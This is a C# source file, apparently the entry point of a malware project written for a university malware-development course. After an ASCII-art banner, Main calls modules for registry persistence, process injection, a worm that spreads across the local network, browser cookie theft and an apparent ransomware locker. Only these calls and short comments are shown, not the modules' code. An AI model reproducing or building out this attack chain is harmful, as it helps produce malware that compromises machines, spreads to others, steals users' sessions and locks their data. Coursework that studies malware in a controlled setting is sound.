// from peroxidee.global
// stream i.luv.werewolves
// trans rights

namespace gigas;

public class Program
{
      public static  void  Main(string[] args)
    {

        Console.WriteLine("  ,--,   ,-.  ,--,     .--.     .---. ");
        Console.WriteLine(".' .'    |(|.' .'     / /\\ \\   ( .-._)");
        Console.WriteLine("|  |  __ (_)|  |  __ / /__\\ \\ (_) \\   ");
        Console.WriteLine("\\  \\ ( _)| |\\  \\ ( _)|  __  | _  \\ \\  ");
        Console.WriteLine(" \\  `-) )| | \\  `-) )| |  |)|( `-'  ) ");
        Console.WriteLine(" )\\____/ `-' )\\____/ |_|  (_) `----'  ");
        Console.WriteLine(" (__)        (__)                      ");
        Console.WriteLine("");
        Console.WriteLine("[*] created by : peroxidee / 0xilvwrlvs");
            Console.WriteLine("[*] malware for malware.dev.ciso.csusb(2024[fall]sem)");
        RegEdit.Write();
        // call the write function to write registry key to the registry
        ProcInj.ProcStart();
        
        Worms.Entrypoint(args[1]);
        // attempt to spread itself to other machines on the same network.
        Cookie.Theif();
        Locker.Pos();

    }
}

